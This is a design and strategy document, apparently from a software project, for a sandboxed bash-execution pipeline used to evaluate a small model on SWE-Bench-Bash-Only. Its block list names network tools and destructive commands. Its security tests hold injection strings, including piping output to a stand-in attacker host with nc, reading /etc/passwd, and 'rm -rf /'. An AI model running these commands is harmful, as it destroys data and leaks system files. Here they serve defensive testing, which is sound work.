# SWE-Bench-Bash-Only Strategy: >70% Accuracy with GraniteTiny

**Analysis Date**: December 30, 2025  
**Target**: >70% accuracy on SWE-Bench-Bash-Only with GraniteTiny  
**Status**: Strategic Analysis Complete

---

## Executive Summary

The Conjecture codebase has **comprehensive SWE-Bench infrastructure** already in place:
- ✅ Production-ready SWE-Bench evaluator (895 lines)
- ✅ Fully configured GraniteTiny model with optimized parameters
- ✅ Extensive benchmark framework (55+ files, 9+ benchmark types)
- ✅ SC-FEAT-001 success criteria tracked in backlog

**The Gap**: Safe bash command execution pipeline with validation, sandboxing, and comprehensive logging.

---

## Problem Analysis

### Current State
The SWE-Bench evaluator can:
- Load real SWE-bench-lite tasks from HuggingFace
- Execute tests in sandboxed environments
- Track metrics and compare approaches
- Generate patches and validate results

### Missing Component
A **safe bash execution pipeline** that:
1. **Validates** bash commands before execution (whitelist-based)
2. **Sandboxes** file operations to repository directory only
3. **Timeouts** dangerous commands (network, recursion, infinite loops)
4. **Logs** all commands for reproducibility and audit trail
5. **Validates** patch syntax before application
6. **Optimizes** for GraniteTiny's limited context (512 tokens)

### Why This Matters
- **Security**: Prevent system damage from malicious or buggy commands
- **Reproducibility**: Full audit trail for evaluation results
- **Compliance**: Track all operations for security audits
- **Performance**: Efficient execution within GraniteTiny's constraints
- **Integration**: Seamless integration with SWE-Bench evaluation framework

---

## Solution Architecture

### 7-Step Implementation Plan

#### Step 1: Bash Command Whitelist (CRITICAL)
**File**: `src/processing/command_validator.py`

```python
# Allowed commands for SWE-Bench tasks
SAFE_COMMANDS = {
    'file_ops': ['cd', 'ls', 'find', 'cat', 'head', 'tail', 'mkdir', 'cp', 'mv'],
    'text_processing': ['grep', 'sed', 'awk', 'sort', 'uniq', 'wc'],
    'development': ['python', 'pip', 'git', 'make', 'pytest', 'java', 'gcc'],
    'inspection': ['file', 'stat', 'du', 'df', 'ps', 'top']
}

# Blocked commands
DANGEROUS_COMMANDS = {
    'system': ['rm -rf', 'dd', 'mkfs', 'reboot', 'shutdown'],
    'privilege': ['sudo', 'su', 'chmod 777'],
    'network': ['curl', 'wget', 'nc', 'telnet'],
    'shell': ['eval', 'exec', 'source', '&&', '||', ';', '|']
}
```

**Security Features**:
- Whitelist-based validation (deny by default)
- Command parsing and extraction
- Prevent command chaining and shell metacharacters
- Path validation to prevent directory traversal
- Comprehensive logging of all attempts

**Functional Requirements**:
- Support common SWE-Bench operations
- Allow legitimate command composition through safe patterns
- Provide clear error messages for blocked commands
- Enable debugging with verbose logging

---

#### Step 2: File Operation Sandboxing (CRITICAL)
**File**: `src/processing/sandbox_manager.py`

```python
class SandboxManager:
    def __init__(self, repo_path: str):
        self.repo_path = Path(repo_path).resolve()
        self.allowed_dirs = {self.repo_path}
    
    def validate_path(self, path: str) -> bool:
        """Ensure path is within repository"""
        resolved = (self.repo_path / path).resolve()
        return str(resolved).startswith(str(self.repo_path))
    
    def create_sandbox(self) -> Path:
        """Create isolated working directory"""
        sandbox = self.repo_path / ".swe_sandbox"
        sandbox.mkdir(exist_ok=True)
        return sandbox
```

**Security Features**:
- Prevent access to /etc, /root, /home, system directories
- Block symlink traversal attacks
- Path normalization and validation
- Resource limits (disk space, file count)
- Suspicious pattern detection

**Functional Requirements**:
- Full read/write access within repo directory
- Support git operations within sandbox
- Enable test execution with proper working directory
- Preserve file permissions and ownership

---

#### Step 3: Execution Timeouts (CRITICAL)
**File**: `src/processing/timeout_executor.py`

```python
class TimeoutExecutor:
    def __init__(self, timeout_seconds: int = 30):
        self.timeout = timeout_seconds
        self.memory_limit = 512 * 1024 * 1024  # 512MB for GraniteTiny
    
    async def execute_with_timeout(self, command: str) -> ExecutionResult:
        """Execute command with timeout and resource limits"""
        try:
            result = await asyncio.wait_for(
                self._run_command(command),
                timeout=self.timeout
            )
            return result
        except asyncio.TimeoutError:
            return ExecutionResult(status="timeout", error="Command exceeded timeout")
```

**Security Features**:
- Prevent denial-of-service through infinite loops
- Block network operations that could hang indefinitely
- Cascading timeouts (command > task > evaluation)
- Proper process cleanup on timeout
- Timeout event logging

**Functional Requirements**:
- Support long-running tests (up to 30s per command)
- Configurable timeout per task type
- Partial results collection on timeout
- Performance analysis tracking

---

#### Step 4: Comprehensive Logging (HIGH)
**File**: `src/processing/execution_logger.py`

```python
class ExecutionLogger:
    def __init__(self, task_id: str):
        self.task_id = task_id
        self.log_file = Path(f".swe_sandbox/{task_id}.log")
    
    def log_command(self, command: str, status: str, output: str, duration: float):
        """Log command execution with full details"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "command": command,
            "status": status,
            "output": output[:1000],  # Truncate large outputs
            "duration": duration,
            "sanitized": self._sanitize_sensitive_data(output)
        }
        self.log_file.write_text(json.dumps(entry) + "\n", mode="a")
```

**Security Features**:
- Sanitize sensitive data (API keys, passwords)
- Implement log access controls
- Create audit trail for compliance
- Log integrity verification (checksums)
- Log retention policies

**Functional Requirements**:
- Enable full reproducibility of evaluation runs
- Support debugging of failed tasks
- Track performance metrics per command
- Enable analysis of command patterns
- Support SWE-Bench integration

---

#### Step 5: Patch Validation (HIGH)
**File**: `src/processing/patch_validator.py`

```python
class PatchValidator:
    def validate_patch(self, patch_content: str) -> bool:
        """Validate unified diff format and safety"""
        # Check format
        if not patch_content.startswith("---"):
            return False
        
        # Parse diff
        diff = unified_diff.parse(patch_content)
        
        # Validate targets are within repo
        for file_path in diff.files:
            if not self.sandbox.validate_path(file_path):
                return False
        
        return True
    
    def dry_run_patch(self, patch_content: str) -> bool:
        """Test patch applicability without applying"""
        # Use git apply --check
        result = subprocess.run(
            ["git", "apply", "--check"],
            input=patch_content,
            capture_output=True
        )
        return result.returncode == 0
```

**Security Features**:
- Prevent malicious patches that modify system files
- Validate patch targets are within repository
- Check for suspicious patterns in patches
- Implement patch signing/verification
- Log all patch operations

**Functional Requirements**:
- Support standard unified diff format
- Enable patch preview before application
- Support multi-file patches
- Enable rollback to previous state
- Track patch application history

---

#### Step 6: SWE-Bench Integration (HIGH)
**File**: Extended `benchmarks/benchmarking/swe_bench_evaluator.py`

```python
class RealSWEBenchEvaluator:
    async def evaluate_with_bash_execution(self, task: SWETask) -> EvaluationOutput:
        """Evaluate task with bash command execution"""
        # 1. Create sandbox
        sandbox = self.sandbox_manager.create_sandbox()
        
        # 2. Get bash commands from LLM
        commands = await self.get_bash_commands_from_llm(task)
        
        # 3. Validate and execute commands
        for cmd in commands:
            if not self.command_validator.is_safe(cmd):
                continue
            
            result = await self.timeout_executor.execute_with_timeout(cmd)
            self.execution_logger.log_command(cmd, result.status, result.output)
        
        # 4. Validate and apply patch
        if self.patch_validator.validate_patch(patch):
            subprocess.run(["git", "apply"], input=patch)
        
        # 5. Run tests
        test_result = await self._execute_tests(task)
        
        return EvaluationOutput(
            result=test_result.status,
            execution_time=test_result.duration,
            output=test_result.output
        )
```

**Integration Points**:
- Extend existing RealSWEBenchEvaluator class
- Use existing SWETask and EvaluationOutput dataclasses
- Integrate with Conjecture 4-layer architecture
- Support comparison with baseline approaches

---

#### Step 7: GraniteTiny Optimization (MEDIUM)
**File**: `src/processing/context_optimizer.py`

```python
class ContextOptimizer:
    def optimize_for_granite_tiny(self, task: SWETask) -> str:
        """Create focused prompt for GraniteTiny's 512-token limit"""
        # 1. Compress problem statement
        problem = self._summarize(task.problem_statement, max_tokens=150)
        
        # 2. Create focused bash prompt
        prompt = f"""
        Fix this issue in {task.repo}:
        {problem}
        
        Provide bash commands to:
        1. Understand the issue
        2. Create a fix
        3. Verify the fix works
        
        Format: One command per line, no explanations.
        """
        
        # 3. Validate token count
        tokens = self._count_tokens(prompt)
        if tokens > 400:  # Leave 112 tokens for response
            prompt = self._compress_further(prompt)
        
        return prompt
```

**Optimization Strategies**:
- Prompt compression and summarization
- Command history summarization
- Focused prompts for bash-specific tasks
- Multi-turn bash interaction patterns
- Confidence scoring for bash commands
- Fallback strategies for complex tasks

---

## Implementation Timeline

### Phase 1: Foundation (Week 1) - CRITICAL
- [ ] `command_validator.py` - Whitelist and validation
- [ ] `sandbox_manager.py` - File operation restrictions
- [ ] `timeout_executor.py` - Execution safety
- [ ] Unit tests for all three modules
- [ ] Integration tests with SWE-Bench evaluator

**Success Criteria**:
- All bash commands validated before execution
- Zero unauthorized file access attempts
- Execution timeouts working correctly

### Phase 2: Reproducibility (Week 2) - HIGH
- [ ] `execution_logger.py` - Comprehensive logging
- [ ] `patch_validator.py` - Patch validation
- [ ] Extended `RealSWEBenchEvaluator` with bash support
- [ ] Integration tests with full pipeline
- [ ] Security audit of bash execution

**Success Criteria**:
- 100% command execution logging
- All patches validated before application
- Full integration with SWE-Bench evaluator

### Phase 3: Optimization (Week 3) - MEDIUM
- [ ] `context_optimizer.py` - GraniteTiny optimization
- [ ] Performance testing and tuning
- [ ] Comprehensive test suite
- [ ] Documentation and usage guides
- [ ] Final validation on SWE-Bench-Bash-Only

**Success Criteria**:
- >70% accuracy on SWE-Bench-Bash-Only
- Reproducible evaluation results
- Comprehensive audit trail

---

## Testing Strategy

### Unit Tests
```python
# test_command_validator.py
def test_safe_command_allowed():
    assert validator.is_safe("ls -la") == True

def test_dangerous_command_blocked():
    assert validator.is_safe("rm -rf /") == False

def test_command_injection_blocked():
    assert validator.is_safe("ls; rm -rf /") == False

# test_sandbox_manager.py
def test_path_validation():
    assert sandbox.validate_path("src/main.py") == True
    assert sandbox.validate_path("../../../etc/passwd") == False

# test_timeout_executor.py
def test_timeout_enforcement():
    result = await executor.execute_with_timeout("sleep 60")
    assert result.status == "timeout"
```

### Integration Tests
```python
# test_bash_execution_pipeline.py
async def test_full_pipeline():
    # 1. Create task
    task = create_test_task()
    
    # 2. Get bash commands from LLM
    commands = await llm.get_bash_commands(task)
    
    # 3. Execute pipeline
    result = await evaluator.evaluate_with_bash_execution(task)
    
    # 4. Verify results
    assert result.result == EvaluationResult.PASSED
    assert len(result.output) > 0
```

### Security Tests
```python
# test_security.py
def test_command_injection_prevention():
    # Attempt various injection patterns
    injections = [
        "ls && rm -rf /",
        "ls | nc attacker.com 1234",
        "ls `whoami`",
        "ls $(cat /etc/passwd)"
    ]
    for injection in injections:
        assert validator.is_safe(injection) == False

def test_directory_traversal_prevention():
    traversals = [
        "../../../etc/passwd",
        "../../..",
        "/etc/passwd"
    ]
    for traversal in traversals:
        assert sandbox.validate_path(traversal) == False
```

---

## Success Metrics

### Primary Goal
- **Accuracy**: >70% on SWE-Bench-Bash-Only with GraniteTiny

### Supporting Metrics
- **Execution Safety**: 100% (no system damage)
- **Reproducibility**: 100% (full audit trail)
- **Performance**: <30s per task
- **Resource Efficiency**: 512MB memory, <100% CPU
- **Command Validation**: 100% of commands validated
- **Logging Completeness**: 100% of operations logged

### Validation Approach
1. **Baseline Establishment**: Run SWE-Bench-Bash-Only with current approach
2. **Incremental Validation**: Measure accuracy improvement after each phase
3. **Final Validation**: Achieve >70% accuracy on full test set
4. **Reproducibility Check**: Verify identical results across multiple runs
5. **Security Audit**: Comprehensive review of bash execution pipeline

---

## Risk Mitigation

| Risk | Mitigation |
|------|-----------|
| **Command Injection** | Whitelist-based validation, no shell interpretation |
| **File System Damage** | Sandbox restrictions, path validation, rollback capability |
| **Resource Exhaustion** | Timeout enforcement, memory limits, CPU limits |
| **Data Loss** | Comprehensive logging, backup before modifications |
| **Reproducibility Issues** | Full audit trail, deterministic execution, version tracking |
| **GraniteTiny Context Overflow** | Prompt compression, multi-turn interactions, fallback strategies |

---

## Architecture Integration

### 4-Layer Architecture Alignment

**Layer 1 (Presentation)**: CLI commands for bash evaluation and monitoring
```bash
python conjecture evaluate-bash --task-id <id> --model granite-tiny
python conjecture bash-logs --task-id <id>
```

**Layer 2 (Endpoint)**: ConjectureEndpoint methods for bash task evaluation
```python
endpoint.evaluate_bash_task(task_id, model="granite-tiny")
endpoint.get_bash_execution_logs(task_id)
```

**Layer 3 (Process)**: Bash execution pipeline with validation and logging
```python
# Command validation
# Sandbox management
# Timeout execution
# Comprehensive logging
# Patch validation
```

**Layer 4 (Data)**: Execution logs and results stored in database
```python
# Execution logs table
# Command history table
# Patch application history table
# Performance metrics table
```

---

## Next Steps

1. **Review and Approval**: Validate this strategy with team
2. **Phase 1 Implementation**: Start with command validator and sandbox manager
3. **Baseline Establishment**: Run SWE-Bench-Bash-Only with current approach
4. **Incremental Testing**: Validate each phase with comprehensive tests
5. **Final Validation**: Achieve >70% accuracy target

---

## References

- **SWE-Bench Evaluator**: `benchmarks/benchmarking/swe_bench_evaluator.py` (895 lines)
- **GraniteTiny Integration**: `docs/ibm_granite_tiny_integration_guide.md` (385 lines)
- **Success Criteria**: `.agent/backlog.md` (SC-FEAT-001)
- **Benchmark Framework**: `benchmarks/benchmarking/` (55+ files)

---

**Analysis Date**: December 30, 2025  
**Status**: Ready for Implementation  
**Confidence**: High (based on existing infrastructure and proven patterns)
